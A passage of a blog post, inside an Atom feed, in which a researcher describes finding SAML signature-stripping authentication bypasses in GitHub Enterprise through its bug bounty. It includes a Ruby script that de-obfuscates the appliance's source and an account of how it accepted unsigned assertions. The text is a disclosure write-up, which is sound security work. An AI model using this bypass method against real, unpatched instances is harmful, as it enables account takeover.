<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Economy of mechanism</title><link href="http://www.economyofmechanism.com/" rel="alternate"></link><link href="http://www.economyofmechanism.com/feeds/all.atom.xml" rel="self"></link><id>http://www.economyofmechanism.com/</id><updated>2017-03-13T00:10:00+02:00</updated><entry><title>The road to your codebase is paved with forged assertions</title><link href="http://www.economyofmechanism.com/github-saml.html" rel="alternate"></link><updated>2017-03-13T00:10:00+02:00</updated><author><name>Ioannis Kakavas</name></author><id>tag:www.economyofmechanism.com,2017-03-13:github-saml.html</id><summary type="html">&lt;div class="contents topic" id="navigation"&gt;
&lt;p class="topic-title first"&gt;Navigation&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;a class="reference internal" href="#tl-dr" id="id5"&gt;TL;DR&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#introduction" id="id6"&gt;Introduction&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#setting-up-the-test-environment" id="id7"&gt;Setting up the test environment&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#getting-the-source-code-of-the-saml-implementation" id="id8"&gt;Getting the source code of the SAML implementation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#verifying-that-everything-works" id="id9"&gt;Verifying that everything works&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#attacking-the-saml-sp-implementation" id="id10"&gt;Attacking the SAML SP Implementation&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#signature-stripping" id="id11"&gt;Signature Stripping&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#overview" id="id12"&gt;Overview&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#details" id="id13"&gt;Details&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#poc" id="id14"&gt;PoC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#disclosure" id="id15"&gt;Disclosure&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#xml-signature-wrapping-attacks" id="id16"&gt;XML Signature Wrapping Attacks&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#overiew" id="id17"&gt;Overiew&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#id1" id="id18"&gt;Details&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#id2" id="id19"&gt;PoC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#exploitability" id="id20"&gt;Exploitability&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#impact" id="id21"&gt;Impact&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#id3" id="id22"&gt;Disclosure&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#timeline" id="id23"&gt;Timeline&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#full-saml-implementation-assessment" id="id24"&gt;Full SAML Implementation Assessment&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#outro" id="id25"&gt;Outro&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div class="section" id="tl-dr"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id5"&gt;TL;DR&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Two vulnerabilities were identified in the SAML Service Provider implementation of Github Enterprise edition that allowed for full authentication bypass. These vulnerabilities were reported to Github via their &lt;a class="reference external" href="https://www.hackerone.com/github"&gt;bug bounty program in Hackerone&lt;/a&gt; and mitigated.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="introduction"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id6"&gt;Introduction&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Github Enterprise allows to be configured for authentication &lt;a class="reference external" href="https://help.github.com/enterprise/2.9/admin/guides/user-management/using-saml"&gt;using SAML&lt;/a&gt; , acting as a SAML Service Provider for the Organization's on premises SAML Identity Provider. For a short introduction on SAML authentication feel free to take a look in my &lt;a class="reference external" href="http://www.economyofmechanism.com/office365-authbypass.html#short-saml-introduction"&gt;previous post&lt;/a&gt; and/or any of the following: &lt;a class="reference external" href="https://en.wikipedia.org/wiki/SAML_2.0#Web_Browser_SSO_Profile"&gt;wikipedia&lt;/a&gt;, &lt;a class="reference external" href="https://developers.onelogin.com/saml"&gt;onelogin saml tutorial&lt;/a&gt;, &lt;a class="reference external" href="https://auth0.com/blog/how-saml-authentication-works/"&gt;auth0 saml how-to&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Ever since I heard that Github supported SAML authentication for it's Enterprise edition, I made a mental note to come back an take a look. I was curious about what I might find but because of Github being Github, I didn't expect to uncover anything significant and I gradually forgot about it. Fast forward to this January when &lt;a class="reference external" href="https://twitter.com/orange_8361"&gt;Orange Tsai&lt;/a&gt; posted their cool &lt;a class="reference external" href="http://blog.orange.tw/2017/01/bug-bounty-github-enterprise-sql-injection.html"&gt;writeup&lt;/a&gt; of the SQL injection vulnerability they discovered in GHE and &lt;a class="reference external" href="https://twitter.com/github/status/818548407987945473"&gt;this tweet&lt;/a&gt; from &lt;a class="reference external" href="https://twitter.com/GithubSecurity"&gt;Github Security&lt;/a&gt; announcing that they will be giving out some bonuses on the vulnerabilities reported in January and February. Orange's writeup triggered my interest and the bounty bonus functioned as a nice incentive.&lt;/p&gt;
&lt;p&gt;This post describes what happened next. The focus will be on how I came about finding the vulnerabilities hoping that you can take something more out of reading this post, rather than just me &amp;quot;bragging&amp;quot; about what I found.&lt;/p&gt;
&lt;div class="section" id="setting-up-the-test-environment"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id7"&gt;Setting up the test environment&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Failing to read the &lt;a class="reference external" href="https://bounty.github.com/#open-bounties"&gt;documentation&lt;/a&gt; properly, I didn't know that I could ask for a testing license from Github, so I went and registered for a normal business trial (Apologies to the friendly sales guy who tried to set up a call with me following that - I never had a legitimate interest in buying).&lt;/p&gt;
&lt;p&gt;I downloaded the qcow2 image, fired up a VM with 2 cpu and 4 GB ram, and.. nothing.&lt;/p&gt;
&lt;div class="figure"&gt;
&lt;img alt="Firing up the VM" src="/images/ghe1.png" style="width: 50%;" /&gt;
&lt;/div&gt;
&lt;p&gt;After navigating to &lt;cite&gt;https://192.168.122.244:8443/setup&lt;/cite&gt; as instructed, I received the following message informing me that I would need 14 more GB of RAM at least to just bootstrap the installation.&lt;/p&gt;
&lt;div class="figure"&gt;
&lt;img alt="Grounded by preflight checks" src="/images/ghe2.png" style="width: 50%;" /&gt;
&lt;/div&gt;
&lt;p&gt;Thinking that I won't probably need all of this memory to just test out the SAML implementation, I focused on how to bypass the limitation. A quick search on how to mount and edit a qcow2 image pointed me to libguestfs and &lt;a class="reference external" href="http://libguestfs.org/guestfish.1.html"&gt;guestfish&lt;/a&gt;
After successfully mounting the image, I did a quick search for 'preflight' and luckily enough I stumbled upon &lt;cite&gt;/usr/local/share/enterprise/ghe-preflight-check&lt;/cite&gt; which contained all the limits. Changing&lt;/p&gt;
&lt;pre class="code literal-block"&gt;
CHECK_REQUIREMENTS = {¬
  default: {memory: 14, blockdev_capacity: 10, rootdev_capacity: 20},¬
}
&lt;/pre&gt;
&lt;p&gt;to&lt;/p&gt;
&lt;pre class="code literal-block"&gt;
CHECK_REQUIREMENTS = {¬
 default: {memory: 3, blockdev_capacity: 10, rootdev_capacity: 20},¬
}
&lt;/pre&gt;
&lt;p&gt;did the trick and I was able to start the VM.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="getting-the-source-code-of-the-saml-implementation"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id8"&gt;Getting the source code of the SAML implementation&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Building on what Orange had described in the write-up, I proceeded to &lt;cite&gt;scp&lt;/cite&gt; the source code from &lt;cite&gt;/data/github/current&lt;/cite&gt; to the host machine and used the following script&lt;/p&gt;
&lt;pre class="code ruby literal-block"&gt;
&lt;span class="nb"&gt;require&lt;/span&gt; &lt;span class="s1"&gt;'zlib'&lt;/span&gt;
&lt;span class="nb"&gt;require&lt;/span&gt; &lt;span class="s1"&gt;'fileutils'&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;This obfuscation is intended to discourage GitHub Enterprise customers from making modifications to the VM. We know this 'encryption' is easily broken. &amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;plaintext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;''&lt;/span&gt;
    &lt;span class="no"&gt;Zlib&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;Inflate&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;inflate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;each_byte&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
        &lt;span class="n"&gt;plaintext&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="o"&gt;].&lt;/span&gt;&lt;span class="n"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;chr&lt;/span&gt;
        &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
    &lt;span class="k"&gt;end&lt;/span&gt;
    &lt;span class="n"&gt;plaintext&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;span class="n"&gt;content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;File&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;ARGV&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;
&lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'./decrypted_source/'&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="no"&gt;ARGV&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;include?&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ruby_concealer.so&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sub!&lt;/span&gt; &lt;span class="sx"&gt;%Q(require &amp;quot;ruby_concealer.so&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="sx"&gt;__ruby_concealer__)&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; decrypt &amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;plaintext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;eval&lt;/span&gt; &lt;span class="n"&gt;content&lt;/span&gt;

    &lt;span class="n"&gt;dirname&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;File&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dirname&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'./decrypted_source/'&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="no"&gt;ARGV&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;unless&lt;/span&gt; &lt;span class="no"&gt;File&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;directory?&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dirname&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
          &lt;span class="no"&gt;FileUtils&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mkdir_p&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dirname&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;end&lt;/span&gt;
&lt;span class="k"&gt;else&lt;/span&gt;
    &lt;span class="n"&gt;plaintext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;content&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;'w'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
    &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;puts&lt;/span&gt; &lt;span class="n"&gt;plaintext&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;to de-obfuscate all ruby files with&lt;/p&gt;
&lt;pre class="code literal-block"&gt;
find . -iname '*.rb' -exec ruby decrypt.rb '{}' \;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="verifying-that-everything-works"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id9"&gt;Verifying that everything works&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Setting up the SAML authentication was quite easy following the steps in &lt;a class="reference external" href="https://help.github.com/enterprise/2.9/admin/guides/user-management/using-saml"&gt;the docs&lt;/a&gt;. For the Identity Provider part, I am using a python project based on &lt;a class="reference external" href="https://pypi.python.org/pypi/pysaml2"&gt;pysaml2&lt;/a&gt; that can handle legitimate IdP functionality as well as a number of automated and semi-automated SAML related attacks. Hopefully it will be released soon and will be the topic of another blog post. I created a dummy IdP certificate&lt;/p&gt;
&lt;pre class="code bash literal-block"&gt;
openssl req -nodes -x509 -newkey rsa:2048 -keyout idp.key -out idp.crt -days 3650
&lt;/pre&gt;
&lt;p&gt;and I set my Issuer to be &lt;a class="reference external" href="https://idp.ikakavas.gr"&gt;https://idp.ikakavas.gr&lt;/a&gt; and the authentication endpoint to &lt;a class="reference external" href="https://idp.ikakavas.gr/sso/redirect"&gt;https://idp.ikakavas.gr/sso/redirect&lt;/a&gt;. Note that the domain doesn't have to resolve to something, since all communication is front-channel via the user's browser, a simple entry in &lt;cite&gt;/etc/hosts&lt;/cite&gt; pointing to localhost is sufficient for testing.
I set up my Identity Provider to release a NameID with format &lt;cite&gt;urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified&lt;/cite&gt; and I was ready to start testing.&lt;/p&gt;
&lt;p&gt;I did a test authentication releasing user1 as the NameID in the Subject of the SAML Assertion and verified that everything works as expected. The user was created in my GHE instance (it supports just in time provisioning) and I was successfully logged in.&lt;/p&gt;
&lt;p&gt;The flow is that of a normal SAML Web Browser Single Sign On.&lt;/p&gt;
&lt;div class="figure"&gt;
&lt;img alt="SAML Web SSO flow" src="/images/ghe_saml_flow.png" style="width: 50%;" /&gt;
&lt;/div&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;User attempts to access &lt;a class="reference external" href="https://192.168.122.244"&gt;https://192.168.122.244&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Since SAML Authentication is enabled and access to the web interface is protected, GHE SAML SP builds an authentication request and redirects the user to the IdP Authentication endpoint with the Authentication Request deflated and urlencoded as a HTTP GET Parameter:&lt;/li&gt;
&lt;li&gt;The IdP validates the request and if it &amp;quot;knows&amp;quot; the Issuer proceeds to authenticate the user&lt;/li&gt;
&lt;li&gt;On successful authentication the IdP constructs a SAMLResponse containing an Assertion with an Authentication Statement and instructs the user browser to post that to the Assertion Consuming Service endpoint of the GHE SAML SP.&lt;/li&gt;
&lt;li&gt;The SAML Response's authenticity and validity is verified, the user is extracted from the NameID of the subject in the SAML Assertion and a session is created for them.&lt;/li&gt;
&lt;li&gt;The session cookie is set and the user is redirected back to &lt;a class="reference external" href="https://192.168.122.244"&gt;https://192.168.122.244&lt;/a&gt; as an authenticated user.&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="attacking-the-saml-sp-implementation"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id10"&gt;Attacking the SAML SP Implementation&lt;/a&gt;&lt;/h2&gt;
&lt;div class="section" id="signature-stripping"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id11"&gt;Signature Stripping&lt;/a&gt;&lt;/h3&gt;
&lt;div class="section" id="overview"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id12"&gt;Overview&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;The first thing I tried was to disable signing the SAML Response and the SAML Assertion that my Identity Provider was sending to the GHE Service Provider. I did that more for due diligence so that I can move on to more promising test cases and almost couldn't believe it when the authentication succeeded.&lt;/p&gt;
&lt;p&gt;If you were too bored to refresh your SAML knowledge above, the equivalent of a Service Provider accepting unsigned SAML assertions is accepting a username without checking the password. Effectively on the flow described above, on step 5, GHE SAML SP accepted any SAML Assertion assuming it was well formed and valid without checking it's authenticity.&lt;/p&gt;
&lt;p&gt;So, in 30 mins time (counting the time it took to figure out how to run the VM with less than 14GB of RAM) I had a very serious bug in my hands. The impact of it was quite severe:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;An external or internal attacker would be able to authenticate as any existing user to a GHE instance.&lt;/li&gt;
&lt;li&gt;An external or internal attacker would be able to create arbitrary users in a given GHE instance, even with elevated privileges (&lt;a class="reference external" href="https://help.github.com/enterprise/2.9/admin/guides/user-management/using-saml/#saml-attributes"&gt;setting the administrator attribute&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;An internal attacker would be able to elevate their privileges by setting the administrator attribute to true for their account.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The thing is that signature verification is a very fundamental part of SAML SSO and I was too surprised and intrigued that this was not checked at all. I had to submit a report in Hackerone, but first I needed to know why.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="details"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id13"&gt;Details&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;A few greps later, I figured out that the SAML implementation is contained within the &lt;cite&gt;/data/github/current/lib/saml&lt;/cite&gt; directory. Ruby is not my strong point but the code seemed straightforward enough. A quick grep for &lt;cite&gt;signature&lt;/cite&gt; left me more perplexed than before as I could see that there are code paths to handle the verification of the Signatures in the SAML Response&lt;/p&gt;
&lt;p&gt;The verification process for an incoming SAML Response starts at &lt;cite&gt;/data/github/current/lib/github/authentication/saml.rb&lt;/cite&gt; which deals with the HTTP POST request to the Assertion Consuming Service Endpoint and specifically in the &lt;code class="rubyinline ruby"&gt;&lt;span class="n"&gt;get_auth_failure_result&lt;/span&gt;&lt;/code&gt; method&lt;/p&gt;
&lt;pre class="code ruby literal-block"&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_auth_failure_result&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;saml_response&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;log_data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="k"&gt;unless&lt;/span&gt; &lt;span class="n"&gt;saml_response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;in_response_to&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;idp_initiated_sso?&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;SAML&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mocked&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:skip_in_response_to_check&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="no"&gt;GitHub&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;Authentication&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;Result&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;external_response_ignored&lt;/span&gt;
  &lt;span class="k"&gt;end&lt;/span&gt;
  &lt;span class="k"&gt;unless&lt;/span&gt; &lt;span class="n"&gt;saml_response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;valid?&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="ss"&gt;:issuer&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;configuration&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:issuer&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="ss"&gt;:idp_certificate&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;idp_certificate&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="ss"&gt;:sp_url&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;configuration&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:sp_url&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
  &lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;log_auth_validation_event&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;log_data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;failure - Invalid SAML response&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;saml_response&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="no"&gt;GitHub&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;Authentication&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;Result&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;failure&lt;/span&gt; &lt;span class="ss"&gt;:message&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;INVALID_RESPONSE&lt;/span&gt;
  &lt;span class="k"&gt;end&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;saml_response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request_denied?&lt;/span&gt;
    &lt;span class="n"&gt;log_auth_validation_event&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;log_data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;failure - RequestDenied&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;saml_response&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="no"&gt;GitHub&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;Authentication&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;Result&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;failure&lt;/span&gt; &lt;span class="ss"&gt;:message&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;saml_response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status_message&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="no"&gt;REQUEST_DENIED_RESPONSE&lt;/span&gt;
  &lt;span class="k"&gt;end&lt;/span&gt;

  &lt;span class="k"&gt;unless&lt;/span&gt; &lt;span class="n"&gt;saml_response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;success?&lt;/span&gt;
    &lt;span class="n"&gt;log_auth_validation_event&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;log_data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;failure - Unauthorized&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;saml_response&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="no"&gt;GitHub&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;Authentication&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;Result&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;failure&lt;/span&gt; &lt;span class="ss"&gt;:message&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;UNAUTHORIZED_RESPONSE&lt;/span&gt;
  &lt;span class="k"&gt;end&lt;/span&gt;

